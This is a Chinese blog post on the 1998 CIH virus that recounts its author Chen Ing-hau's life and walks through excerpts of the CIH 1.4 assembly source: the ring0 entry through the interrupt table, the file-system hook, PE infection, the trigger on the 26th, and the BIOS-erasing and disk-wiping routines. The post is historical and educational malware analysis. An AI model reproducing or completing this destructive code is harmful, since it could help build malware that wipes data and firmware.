---layout: posttitle: "CIH二三事"tagline: ""description: "关于CIH及其作者陈盈豪的新闻"category: tags: [信息安全]last_updated: 2021-09-15---在母亲的回忆里，中学时的陈盈豪就很喜欢玩电脑，上了高中后更是开始专心研究电脑软件。高一那年，他开始学习 BASIC 和 C 语言，「那时候我一点都不懂，我的电脑启蒙是从电脑游戏开始的」。插卡、拔卡、研究游戏，以为这一辈子要变成游戏的设计者的他从没想过要成为病毒的制造者，报考大学也是为了写出完美的程序——因为「电脑对于我来说就是一切」。T 恤、短裤、凉鞋，常常一副还没睡醒的样子就来上课，就是大学同学眼中的陈盈豪。不过一提起电脑马上变得不一样，甚至一下课就会跑会宿舍打开电脑，练习编程。Windows 95 的出现让他转移了注意力，大二时开始研究 Windows 的 Kernel（内核，操作系统的核心部分）。每天打开系统找 Bug，有时为了怕自己忘记已经进行到哪里，常常 24 小时不睡觉一直不停的调试。直到他发现 Windows95 只要通过一行 C 语言程序就可以让系统宕机，这行程序能毁掉中断向量表——这也是 CIH 病毒体积只有 700 个字节，却能毁掉系统的原因之一。[^1st]不到1KB就能删除你的BIOS，破坏你的硬盘。[^2nd]他一致强调兴趣执着和专注力。在 2013HITCON 现场，主持人问及如何在接触电脑 5 年的时间内就能写出 CIH，陈盈豪的回答是「因为只做一件事」。专注于一件事情，网站、Java 都不写，把所有时间都放在专注研究 Kernel 上。高一第一次接触电脑病毒时，陈盈豪觉得病毒很恐怖、担心会被传染，大学的课程和对专业知识的钻研造就驱散了这些恐惧。大四时周围的人都说电脑病毒无法毁掉 BIOS（基本输入输出系统，为计算机提供最底层的、最直接的硬件设置和控制），他却认为有工具能升级 BIOS，那么病毒也可以升级它。为了调试程序陈盈豪电脑的 BIOS 当然也烧掉过——屏幕一片漆黑——再烧买来的第二颗新的 BIOS。不眠不休的一步步调试，再加上喜欢优化程序一个一个字符的减少病毒体积，CIH 病毒最后只有不到 800 个字节。作为实验程序，CIH 被陈盈豪存储在校内供他个人使用的主机上，并加上了「病毒」的警告。他的本意并不是为了造成破坏，CIH 的流行是因为在他不知情的状况下，他的同学使用了实验用电脑而将病毒携出。不然谁会用自己的名字，去命名一个病毒？体积小、能自行改变程序码分布、又能隐藏在文件未使用的空白区且不改变文件大小，CIH 由于不易察觉而迅速传播开来。1998 年 4 月 26 日 CIH 第一次爆发就震惊了世界，让 6000 万主机宕机的病毒背后，竟然是一个还在读大学的年轻人。# 源码分析[2nd]CIH 1.4 的源码可以在github上[找到]<https://github.com/onx/CIH>。作者的编码习惯很好，各部分都也有注释，开头部分是版本记录，将版本变化的具体时间和具体功能都记录了下来。我们先把时间线理一下。1.0版的完成时间是1998年4月26日, 完成基本功能，此时病毒的大小是656个字节。1.1版的完成时间是1998年5月15日, 增加操作系统判断，如果是WinNT，则不运行病毒，此时病毒的大小是796个字节。1.2版的完成时间是1998年5月21日, 增加删除BIOS和破坏硬盘功能，此时病毒的大小是1003个字节。1.3版的完成时间是1998年5月24日, 修复感染winzip自解压文件的错误，此时病毒的大小是1010个字节。1.4版的完成时间是1998年5月31日, 彻底修复感染winzip自解压文件的错误，此时病毒的大小是1019个字节。1998年7月26日，CIH病毒在美国大面积传播；1998年8月26日，CIH病毒实现了全球蔓延，公安部发出紧急通知，新华社和新闻联播跟进报导；之后，CIH病毒作者陈盈豪公开道歉并积极提供解毒程式和防毒程式，CIH病毒逐渐得到有效控制。## PE文件头源码第一部分是文件头:```OriginalAppEXE SEGMENTFileHeader:db 04dh, 05ah, 090h, 000h, 003h, 000h, 000h, 000hdb 004h, 000h, 000h, 000h, 0ffh, 0ffh, 000h, 000hdb 0b8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h.....db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000hdb 0c3h, 000h, 000h, 000h, 000h, 000h, 000h, 000hdd 00000000h, VirusSizeOriginalAppEXE ENDS```就是PE文件的MZ文件头。这段文件头的主要目的是为了符合PE(Portable Execute, 可移植执行文件格式)文件格式.我们常见的EXE，DLL，OCX等文件都必须符合微软规定的PE格式，这样Windows操作系统才能识别并执行，这里我们跳过不做分析，感兴趣的读者可以对照PE文件头和源码自行分析。网络上也有很多关于PE格式分析的文章。另外，请各位读者注意，因为CIH的故事已经过去很久了，CIH所曾经使用的有些技术已经过时，但却能在今天找到借鉴，有些技术则没有过时，可谓生命力顽强，这一点我会在文章中一一指出，希望能供大家参考借鉴。```VirusGame SEGMENTASSUME CS:VirusGame, DS:VirusGame, SS:VirusGameASSUME ES:VirusGame, FS:VirusGame, GS:VirusGame; *********************************************************; * Ring3 Virus Game Initial Program *; *********************************************************```病毒真正开始运行是从VirusGame段开始的。作者完成这个病毒时是23岁，还是少年人的心性。## 修改SEH```MyVirusStart:push ebp; *************************************; * Let's Modify Structured Exception *; * Handing, Prevent Exception Error *; * Occurrence, Especially in NT. *; *************************************lea eax, [esp-04h*2]xor ebx, ebxxchg eax, fs:[ebx]call @0@0:pop ebxlea ecx, StopToRunVirusCode-@0[ebx]push ecxpush eax```程序的第一段是修改Windows的SEH\(Structured Exception Handing\)。首先，什么是SEH?为什么要修改SEH呢？SEH，Structured Exception Handing, 结构化异常处理，是Windows操作系统的异常和分发处理机制.该机制的实现方式是将FS\[0\]指向一个链表，该链表告诉操作系统当出现异常的时候应该找谁处理。类似于我们现实生活中的紧急联系人列表，如果应用程序出了什么问题，就交给链表中的一号紧急联系人处理，如果一号紧急联系人无法处理，就交给二号联系人。依次类推。当所有的异常处理函数都调用完成，而异常仍然没有处理掉，这时，操作系统就会调用默认的异常处理程序，通常是给出错误提示并关闭应用程序。而修改SEH的原因我们会在稍后介绍。以上代码通过修改FS\[0\]使得当前的SEH指向StopToRunVirusCodeSEH是Windows提供的异常处理机制，直至今天仍然在各个安全领域应用。## 进入内核```odify *; * IDT(Interrupt Descriptor Table) *; * to Get Ring0 Privilege... *; *************************************push eax ;sidt [esp-02h] ; Get IDT Base Addresspop ebx ;add ebx, HookExceptionNumber*08h+04h ; ZF = 0climov ebp, [ebx] ; Get Exception Basemov bp, [ebx-04h] ; Entry Pointlea esi, MyExceptionHook-@1[ecx]push esimov [ebx-04h], si ;shr esi, 16 ; Modify Exceptionmov [ebx+02h], si ; Entry Point Addresspop esiint HookExceptionNumber```接下来这段代码通过修改中断描述符表，获得CPU的ring0权限。而在WinNT操作系统中，IDT所指向的内存已经无法修改，因此在执行这段代码时，会产生异常。也就是说，这种获取Ring0权限的方法，现在已经没有效果了。因此，上段代码修改SEH,或者称为编辑SEH的目的就很明了了。目的就在与识别当前的操作系统，如果发现是WinNT或以后的操作系统，就会自动产生异常并跳到StopToRunVirusCode，停止运行。当在win9x操作系统时，这段代码通过修改中断描述符表，使异常处理函数指向MyExceptionHook。最后一句    int HookExceptionNumber则直接触发异常，进入MyExceptionHook。下面我们进入MyExceptionHook进行分析。```MyExceptionHook:@2 = MyExceptionHookjz InstallMyFileSystemApiHook; *************************************; * Do My Virus Exist in System !? *; *************************************mov ecx, dr0jecxz AllocateSystemMemoryPage```这里有一个小技巧。病毒使用dr0寄存器存放病毒的安装状态，dr0寄存器主要用于调试，在应用程序正常运行过程中一般不会修改。因此，将其作为一个全局的临时寄存器。第一次进入MyExceptionHook时，因为jz的条件并不成立，并不会跳到InstallMyFileSystemApiHook, 而是跳到AllocateSystemMemoryPage进行内存的分配。此后我们还会第二次回到MyExceptionHook，这时才会调用InstallMyFileSystemApiHook,安装系统钩子。```; *************************************; * Merge All Virus Code Section *; *************************************push esimov esi, eaxLoopOfMergeAllVirusCodeSection:mov ecx, [eax-04h]rep movsbsub eax, 08hmov esi, [eax]or esi, esijz QuitLoopOfMergeAllVirusCodeSection ; ZF = 1jmp LoopOfMergeAllVirusCodeSectionQuitLoopOfMergeAllVirusCodeSection:pop esi```在调用AllocateSystemMemoryPage分配了系统内存后，接下来这段代码会将病毒代码复制到此前分配的系统内存中。## 挂钩系统调用```; *************************************; * Generate Exception Again *; *************************************int HookExceptionNumber ; GenerateException Again```接下来第二次调用int指令进入MyExceptionHook。接着会跳到InstallMyFileSystemApiHook。```InstallMyFileSystemApiHook:lea eax, FileSystemApiHook-@6[edi]push eax ;int 20h ; VXDCALL IFSMgr_InstallFileSystemApiHookIFSMgr_InstallFileSystemApiHook = $ ;dd 00400067h ; Use EAX, ECX, EDX, and flagsmov dr0, eax ; Save OldFileSystemApiHook Addresspop eax ; EAX = FileSystemApiHook Address; Save Old IFSMgr_InstallFileSystemApiHook Entry Pointmov ecx, IFSMgr_InstallFileSystemApiHook-@2[esi]mov edx, [ecx]mov OldInstallFileSystemApiHook-@3[eax], edx; Modify IFSMgr_InstallFileSystemApiHook Entry Pointlea eax, InstallFileSystemApiHook-@3[eax]mov [ecx], eaxclijmp ExitRing0Init```顾名思义，以上代码就是把病毒的文件处理函数hook到系统调用中。采用的是一种已经被Windows废弃了的技术，叫做VXD，这种技术只能在win9x系统上才能使用，到了WinNT已经不能使用了。但实际上原理是一样的，主要的目的是挂钩文件操作函数的系统调用，方法也大同小异，先获取旧的系统调用地址，使用我们的调用函数替换旧的函数，执行完我们的功能后回到旧的地址。花开两枝，我们各表一支。到这里我们先记住，病毒安装了一个系统调用钩子，当执行文件操作的时候，会运行到我们的钩子函数里面。这里我们看到，安装完钩子以后，会跳到ExitRing0Init，退出ring0状态。```ExitRing0Init:mov [ebx-04h], bp ;shr ebp, 16 ; Restore Exceptionmov [ebx+02h], bp ;iretd```退出Ring0之后接着向下走。```; *************************************; * Let's Restore *; * Structured Exception Handing *; *************************************ReadyRestoreSE:stixor ebx, ebxjmp RestoreSERestoreSE:pop dword ptr fs:[ebx]pop eax; *************************************; * Return Original App to Execute *; *************************************pop ebppush 00401000h ; Push OriginalOriginalAddressOfEntryPoint = $-4 ; App Entry Point to Stackret ; Return to Original App Entry Point```这时，打开中断并恢复之前被病毒修改的SEH，毕竟我们的中断已经关得够久了。最后，如果是通过其他被感染的程序进来的，就回到之前程序的入口点继续执行，否则，直接ret退出。接下来，我们分析之前挂钩的函数FileSystemApiHook;当有文件读写调用时，Windows会调用被病毒替换的FileSystemApiHook。因为是VXD的驱动程序，程序借鉴意义不大，到这里，我们加快速度，分析的粒度会粗一些。首先根据系统调用的入参判断是否是打开文件调用。如果是打开文件调用则获取需要打开的文件的路径。接着，作者用大概100行左右的汇编代码判断一个文件是否是PE文件，如果是PE文件就将病毒代码感染到文件中。感染的方式将病毒代码写入PE文件，修改PE文件的签名，并修改入口点为病毒代码。```; ***************************; * Let's Modify the *; * AddressOfEntryPoint to *; * My Virus Entry Point *; ***************************mov (NewAddressOfEntryPoint-@9)[esi], edx; ***************************; * Let's Write *; * Virus Code to the File *; ***************************WriteVirusCodeToFile:......jmp WriteVirusCodeToFile```## 潜伏与发作同时，当系统调用参数为cloasefile时，进行当前时间判断：```CloseFile:xor eax, eaxmov ah, 0d7hcall edi ; VXDCall IFSMgr_Ring0_FileIO; *************************************; * Need to Restore File Modification *; * Time !? *; *************************************popfpop esijnc IsKillComputerIsKillComputer:; Get Now Day from BIOS CMOSmov al, 07hout 70h, alin al, 71hxor al, 26h ; ??/26/????```在IsKillComputer可以看到CIH设计了一个潜伏策略，先感染，然后并不发作，以增加感染的机会，直到当前日期是26日时大家统一发作。当时间悄然的来到26号时，CIH开始破坏BIOS和硬盘。破坏BIOS的方法为：1.将BIOS的内容映射到内存，然后设置BIOS可写。主要调用了IOForEEPROM和EnableEEPROMToWrite。```IOForEEPROM:@10 = IOForEEPROMxchg eax, edixchg edx, ebpout dx, eaxxchg eax, edixchg edx, ebpin al, dxBooleanCalculateCode = $or al, 44hxchg eax, edixchg edx, ebpout dx, eaxxchg eax, edixchg edx, ebpout dx, alret```从上面的代码可以看到，CIH使用in，和out指令进行BIOS数据的修改。而破坏硬盘的方法是利用了我们之前提到的VXD调用IOS_SendCommand。```KillHardDisk:......push ebxsub esp, 2chpush 0c0001000hmov bh, 08hpush ebxpush ecxpush ecxpush ecxpush 40000501hinc ecxpush ecxpush ecxmov esi, espsub esp, 0achLoopOfKillHardDisk:int 20hdd 00100004h ; VXDCall IOS_SendCommand......jmp LoopOfKillHardDisk```## 总结最后，我们来梳理一下：1. 病毒得到执行后会修改IDT，进入内核。这应该算是Win9X系统的一个漏洞，在WinNT及以后的系统这种进入内核的方法已经失效。3. 进入内核的主要目的安装系统钩子，钩住文件读写调用，钩住系统调用后退出Ring0;4. 当有文件读写调用且文件是PE文件时，将病毒感染到PE文件中。5. 潜伏下来，直到每月的26日统一发作,开始破坏BIOS和硬盘数据。# 后续[^1st]由于新竹和台北的科技企业离故乡太远，陈盈豪毕业后选择了一家做 Linux 系统的公司工作，因为「骑车只要 10 分钟」。后来又到集嘉通訊为系统排除疑难杂症，还开发出了一套自己独有的分析程序（被他称为「善良病毒」）测试手机系统。2012 年，休假的陈盈豪选择徒步环台湾岛一周。55 天、1200 公里，每天 10 小时的步行，在路途上思考「为什么而活」。旅途上积累的回忆却没有产品梳理，休息了一年后的 2013 年 7 月，陈盈豪正式开始了自己的创业项目 8tory。8tory 是一款基于照片 GPS 信息的照片分享应用，当你拍完照片就能看到照片的地点、地图，还可以向他人展示你的经历。主打「回忆」的这款安卓客户端应用。![CIH Linked-in profile](images/20220125-CIH-Linkedin-page.png)在知乎「那些曾经大名鼎鼎的黑客现在都在干什么？」这个问题下（没错他已经注册了[知乎]<http://www.zhihu.com/people/CIH.Hacker>），陈盈豪[写下了]<http://www.zhihu.com/question/31425611/answer/52454043>创业的艰难，需要面对用户、面对投资人、需要资金，「一直被用戶狠狠的教訓」，但并不会放弃。（2015年）7 月陈盈豪将会来到北京，参加乌云白帽子大会。[^1st]: <https://www.geekpark.net/news/212936>[^2nd]: <https://www.anquanke.com/post/id/164959>